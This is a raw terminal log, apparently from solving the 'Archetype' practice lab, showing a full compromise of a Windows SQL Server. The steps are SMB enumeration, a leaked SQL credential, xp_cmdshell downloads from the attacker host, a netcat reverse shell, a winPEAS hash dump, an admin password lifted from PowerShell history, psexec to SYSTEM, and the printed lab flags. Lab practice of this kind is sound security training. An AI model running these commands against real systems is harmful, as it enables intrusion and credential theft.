# Nmap 7.92 scan initiated Sat May 14 15:50:46 2022 as: nmap -v -p- --min-rate 5000 -sV -sC -n -o archetype.nmap.txt archetype
Increasing send delay for 10.129.52.14 from 0 to 5 due to 516 out of 1719 dropped probes since last increase.
Increasing send delay for 10.129.52.14 from 5 to 10 due to 65 out of 216 dropped probes since last increase.
Increasing send delay for 10.129.52.14 from 40 to 80 due to 11 out of 14 dropped probes since last increase.
Warning: 10.129.52.14 giving up on port because retransmission cap hit (10).
Nmap scan report for archetype (10.129.52.14)
Host is up (0.12s latency).
Not shown: 56422 closed tcp ports (conn-refused), 9105 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-05-14T14:52:41
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-05-14T07:52:39-07:00
| ms-sql-info: 
|   10.129.52.14:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_clock-skew: mean: 1h19m59s, deviation: 4h02m30s, median: -1h00m01s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat May 14 15:52:50 2022 -- 1 IP address (1 host up) scanned in 124.04 seconds


Enter WORKGROUP\kali's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to archetype failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available


└─$ smbclient \\\\archetype\\backups   
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 20 12:20:57 2020
  ..                                  D        0  Mon Jan 20 12:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 12:23:02 2020

                5056511 blocks of size 4096. 2524759 blocks available
smb: \> cd ..
smb: \> dir /a
NT_STATUS_NO_SUCH_FILE listing \a
smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (1.2 KiloBytes/sec) (average 1.2 KiloBytes/sec)
smb: \> quit

SE INSTALA IMPACKET
-------------------

┌──(kali㉿kali)-[~]
└─$ python3 impacket/examples/mssqlclient.py ARCHETYPE\sql_svc:M3g4c0rp123@archetype -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[-] ERROR(ARCHETYPE): Line 1: Login failed for user 'ARCHETYPE\Guest'.
                                                                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ python3 impacket/examples/mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@archetype -windows-auth

└─$ python3 impacket/examples/mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@archetype -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
     


The system cannot find the path specified.                                         

NULL                                                                               

SQL> xp_cmdshell dir c:\users\
output                                                                             

--------------------------------------------------------------------------------   

 Volume in drive C has no label.                                                   

 Volume Serial Number is 9565-0B4F                                                 

NULL                                                                               

 Directory of c:\users                                                             

NULL                                                                               

01/19/2020  04:10 PM    <DIR>          .                                           

01/19/2020  04:10 PM    <DIR>          ..                                          

01/19/2020  11:39 PM    <DIR>          Administrator                               

01/19/2020  11:39 PM    <DIR>          Public                                      

01/20/2020  06:01 AM    <DIR>          sql_svc                                     

               0 File(s)              0 bytes                                      

               5 Dir(s)  10,715,082,752 bytes free                                 

NULL                                                                               

SQL> xp_cmdshell dir c:\users\sql_svc
output                                                                             

--------------------------------------------------------------------------------   

 Volume in drive C has no label.                                                   

 Volume Serial Number is 9565-0B4F                                                 

NULL                                                                               

 Directory of c:\users                                                             

NULL                                                                               

01/19/2020  04:10 PM    <DIR>          .                                           

01/19/2020  04:10 PM    <DIR>          ..                                          

01/19/2020  11:39 PM    <DIR>          Administrator                               

01/19/2020  11:39 PM    <DIR>          Public                                      

01/20/2020  06:01 AM    <DIR>          sql_svc                                     

               0 File(s)              0 bytes                                      

               5 Dir(s)  10,715,082,752 bytes free                                 

NULL                                                                               

SQL> xp_cmdshell dir c:\users\sql_svc
output                                                                             

--------------------------------------------------------------------------------   

 Volume in drive C has no label.                                                   

 Volume Serial Number is 9565-0B4F                                                 

NULL                                                                               

 Directory of c:\users\sql_svc                                                     

NULL                                                                               

01/20/2020  06:01 AM    <DIR>          .                                           

01/20/2020  06:01 AM    <DIR>          ..                                          

01/20/2020  06:01 AM    <DIR>          3D Objects                                  

01/20/2020  06:01 AM    <DIR>          Contacts                                    

01/20/2020  06:42 AM    <DIR>          Desktop                                     

01/20/2020  06:01 AM    <DIR>          Documents                                   

01/20/2020  06:01 AM    <DIR>          Downloads                                   

01/20/2020  06:01 AM    <DIR>          Favorites                                   

01/20/2020  06:01 AM    <DIR>          Links                                       

01/20/2020  06:01 AM    <DIR>          Music                                       

01/20/2020  06:01 AM    <DIR>          Pictures                                    

01/20/2020  06:01 AM    <DIR>          Saved Games                                 

01/20/2020  06:01 AM    <DIR>          Searches                                    

01/20/2020  06:01 AM    <DIR>          Videos                                      

               0 File(s)              0 bytes                                      

              14 Dir(s)  10,715,082,752 bytes free                                 

NULL                                                                               

SQL> xp_cmdshell dir c:\users\sql_svc\Desktop\
output                                                                             

--------------------------------------------------------------------------------   

 Volume in drive C has no label.                                                   

 Volume Serial Number is 9565-0B4F                                                 

NULL                                                                               

 Directory of c:\users\sql_svc                                                     

NULL                                                                               

01/20/2020  06:01 AM    <DIR>          .                                           

01/20/2020  06:01 AM    <DIR>          ..                                          

01/20/2020  06:01 AM    <DIR>          3D Objects                                  

01/20/2020  06:01 AM    <DIR>          Contacts                                    

01/20/2020  06:42 AM    <DIR>          Desktop                                     

01/20/2020  06:01 AM    <DIR>          Documents                                   

01/20/2020  06:01 AM    <DIR>          Downloads                                   

01/20/2020  06:01 AM    <DIR>          Favorites                                   

01/20/2020  06:01 AM    <DIR>          Links                                       

01/20/2020  06:01 AM    <DIR>          Music                                       

01/20/2020  06:01 AM    <DIR>          Pictures                                    

01/20/2020  06:01 AM    <DIR>          Saved Games                                 

01/20/2020  06:01 AM    <DIR>          Searches                                    

01/20/2020  06:01 AM    <DIR>          Videos                                      

               0 File(s)              0 bytes                                      

              14 Dir(s)  10,715,082,752 bytes free                                 

NULL                                                                               

SQL> xp_cmdshell dir c:\users\sql_svc\Desktop\
output                                                                             

--------------------------------------------------------------------------------   

 Volume in drive C has no label.                                                   

 Volume Serial Number is 9565-0B4F                                                 

NULL                                                                               

 Directory of c:\users\sql_svc\Desktop                                             

NULL                                                                               

01/20/2020  06:42 AM    <DIR>          .                                           

01/20/2020  06:42 AM    <DIR>          ..                                          

02/25/2020  07:37 AM                32 user.txt                                    

               1 File(s)             32 bytes                                      

               2 Dir(s)  10,715,082,752 bytes free                                 

NULL                                                                               

SQL> xp_cmdshell dir c:\users\sql_svc\Desktop\;
output                                                                             

--------------------------------------------------------------------------------   

 Volume in drive C has no label.                                                   

 Volume Serial Number is 9565-0B4F                                                 

NULL                                                                               

 Directory of c:\users\sql_svc\Desktop                                             

NULL                                                                               

01/20/2020  06:42 AM    <DIR>          .                                           

01/20/2020  06:42 AM    <DIR>          ..                                          

02/25/2020  07:37 AM                32 user.txt                                    

               1 File(s)             32 bytes                                      

               2 Dir(s)  10,715,082,752 bytes free                                 

NULL                                                                               

SQL> xp_cmdshell dir c:\users\sql_svc\Desktop\user.txt;
output                                                                             

--------------------------------------------------------------------------------   

 Volume in drive C has no label.                                                   

 Volume Serial Number is 9565-0B4F                                                 

NULL                                                                               

 Directory of c:\users\sql_svc\Desktop                                             

NULL                                                                               

01/20/2020  06:42 AM    <DIR>          .                                           

01/20/2020  06:42 AM    <DIR>          ..                                          

02/25/2020  07:37 AM                32 user.txt                                    

               1 File(s)             32 bytes                                      

               2 Dir(s)  10,714,968,064 bytes free                                 

NULL                                                                               

SQL> xp_cmdshell type c:\users\sql_svc\Desktop\user.txt;
output                                                                             

--------------------------------------------------------------------------------   

 Volume in drive C has no label.                                                   

 Volume Serial Number is 9565-0B4F                                                 

NULL                                                                               

 Directory of c:\users\sql_svc\Desktop                                             

NULL                                                                               

02/25/2020  07:37 AM                32 user.txt                                    

               1 File(s)             32 bytes                                      

               0 Dir(s)  10,714,968,064 bytes free                                 

NULL                                                                               

SQL> xp_cmdshell type c:\users\sql_svc\Desktop\user.txt;
output                                                                             

--------------------------------------------------------------------------------   

3e7b102e78218e935bf3f4951fec21a3               



WINPEAS - para descubrir posibles rutas para escala privilegios.


   SQL> xp_cmdshell net users
output                                                                             

--------------------------------------------------------------------------------   

NULL                                                                               

User accounts for \\ARCHETYPE                                                      

NULL                                                                               

-------------------------------------------------------------------------------    

Administrator            DefaultAccount           Guest                            

sql_svc                  WDAGUtilityAccount                                        

The command completed successfully.                                                

NULL                                                                               

NULL                                                                               

SQL> xp_cmdshell "powershell -c cd c:\Users\sql_svc\Downloads; wget http://10.10.15.165/test.txt -outfile test2.txt"
output                                                                             

--------------------------------------------------------------------------------   

NULL                                                                               

--------------------------------------------------------------------------------   

NULL                                                                               

SQL> xp_cmdshell "powershell -c dir c:\Users\sql_svc\Downloads"
output                                                                             

--------------------------------------------------------------------------------   

NULL                                                                               

NULL                                                                               

    Directory: C:\Users\sql_svc\Downloads                                          

NULL                                                                               

NULL                                                                               

Mode                LastWriteTime         Length Name                                                                     

----                -------------         ------ ----                                                                     

-a----        5/14/2022   9:14 AM              7 test2.txt                                                                

NULL                                                                               

NULL                                                                               

NULL                                                                               

SQL> 



 --------------------------------------------------------------------------------   

NULL                                                                               

SQL> xp_cmdshell "powershell -c dir c:\Users\sql_svc\Downloads"
output                                                                             

--------------------------------------------------------------------------------   

NULL                                                                               

NULL                                                                               

    Directory: C:\Users\sql_svc\Downloads                                          

NULL                                                                               

NULL                                                                               

Mode                LastWriteTime         Length Name                                                                     

----                -------------         ------ ----                                                                     

-a----        5/14/2022   9:14 AM              7 test2.txt                                                                

NULL                                                                               

NULL                                                                               

NULL                                                                               

SQL> 


------------
SQL> xp_cmdshell "powershell -c cd c:\users\sql_svc\Downloads\nc64.exe -e c:\windows\system32\cmd.exe 10.10.15.165 12345"
output                                                                             

--------------------------------------------------------------------------------   

Set-Location : Parameter cannot be processed because the parameter name 'e' is ambiguous. Possible matches include:    

-ErrorAction -ErrorVariable.                                                       

At line:1 char:40                                                                  

+ cd c:\users\sql_svc\Downloads\nc64.exe -e c:\windows\system32\cmd.exe ...        

+                                        ~~                                        

    + CategoryInfo          : InvalidArgument: (:) [Set-Location], ParameterBindingException   

    + FullyQualifiedErrorId : AmbiguousParameter,Microsoft.PowerShell.Commands.SetLocationCommand   

                                                                                   

NULL                                                                               

SQL> xp_cmdshell "powershell -c c:\users\sql_svc\Downloads\nc64.exe -e c:\windows\system32\cmd.exe 10.10.15.165 12345"



C:\Windows\system32>whoami
whoami
archetype\sql_svc

C:\Windows\system32>net user view
net user view
The user name could not be found.

More help is available by typing NET HELPMSG 2221.


C:\Windows\system32>net user
net user

User accounts for \\ARCHETYPE

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
sql_svc                  WDAGUtilityAccount       
The command completed successfully.


C:\Windows\system32>powershell

PS C:\Users\sql_svc\Downloads> wget http://10.10.165/winPEASx64.exe -outfile winPEASx64.exe
wget http://10.10.165/winPEASx64.exe -outfile winPEASx64.exe
wget : Unable to connect to the remote server
At line:1 char:1
+ wget http://10.10.165/winPEASx64.exe -outfile winPEASx64.exe
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebExc 
   eption
    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
 
PS C:\Users\sql_svc\Downloads> wget http://10.10.15.165/winPEASx64.exe -outfile winPEASx64.exe
wget http://10.10.15.165/winPEASx64.exe -outfile winPEASx64.exe
PS C:\Users\sql_svc\Downloads> dir
dir


    Directory: C:\Users\sql_svc\Downloads


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        5/14/2022   1:55 PM          45272 nc64.exe                                                              
-a----        5/14/2022   1:52 PM              6 tt.txt                                                                
-a----        5/14/2022   2:11 PM        1930752 winPEASx64.exe                                                        


PS C:\Users\sql_svc\Downloads> winPEASx64.exe
winPEASx64.exe
winPEASx64.exe : The term 'winPEASx64.exe' is not recognized as the name of a cmdlet, function, script file, or 
operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try 


����������͹ Enumerating Security Packages Credentials
  Version: NetNTLMv2
  Hash:    sql_svc::ARCHETYPE:1122334455667788:fd31b116f690af568c52c822bc8da410:0101000000000000fac217c6d867d8010a31a987db6d20d8000000000800300030000000000000000000000000300000bfefed9e745e30b1e1743b4eec17a69e7888002d3e3005f5f24560ad031054710a00100000000000000000000000000000000000090000000000000000000000   


����������͹ Analyzing Windows Files Files (limit 70)
    C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    C:\Users\Default\NTUSER.DAT
    C:\Users\sql_svc\NTUSER.DAT

����������͹ Analyzing Other Windows Files Files (limit 70)



 Directory of c:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine

01/20/2020  06:04 AM    <DIR>          .
01/20/2020  06:04 AM    <DIR>          ..
03/17/2020  02:36 AM                79 ConsoleHost_history.txt
               1 File(s)             79 bytes
               2 Dir(s)  10,713,747,456 bytes free

c:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine>type ConsoleHost_history.txt
type ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit

c:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine>

--------------------------------------------------------------------------

Escalada privilegios:
---------------------

┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ python3 psexec.py administrator:@archetype 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] Requesting shares on archetype.....
[*] Found writable share ADMIN$
[*] Uploading file cjAYziEH.exe
[*] Opening SVCManager on archetype.....
[*] Creating service Pavo on archetype.....
[*] Starting service Pavo.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> cd c:\users\Administrator
 
c:\Users\Administrator> dir
 Volume in drive C has no label.
 Volume Serial Number is 9565-0B4F

 Directory of c:\Users\Administrator

01/19/2020  11:39 PM    <DIR>          .
01/19/2020  11:39 PM    <DIR>          ..
07/27/2021  02:30 AM    <DIR>          3D Objects
07/27/2021  02:30 AM    <DIR>          Contacts
07/27/2021  02:30 AM    <DIR>          Desktop
07/27/2021  02:30 AM    <DIR>          Documents
07/27/2021  02:30 AM    <DIR>          Downloads
07/27/2021  02:30 AM    <DIR>          Favorites
07/27/2021  02:30 AM    <DIR>          Links
07/27/2021  02:30 AM    <DIR>          Music
07/27/2021  02:30 AM    <DIR>          Pictures
07/27/2021  02:30 AM    <DIR>          Saved Games
07/27/2021  02:30 AM    <DIR>          Searches
07/27/2021  02:30 AM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)  10,712,395,776 bytes free

c:\Users\Administrator> cd Desktop
 
c:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 9565-0B4F

 Directory of c:\Users\Administrator\Desktop

07/27/2021  02:30 AM    <DIR>          .
07/27/2021  02:30 AM    <DIR>          ..
02/25/2020  07:36 AM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  10,712,395,776 bytes free

c:\Users\Administrator\Desktop> type c:\users\sql_svc\Desktop\user.txt
3e7b102e78218e935bf3f4951fec21a3
c:\Users\Administrator\Desktop> type root.txt
b91ccec3305e98240082d4474b848528
c:\Users\Administrator\Desktop> 

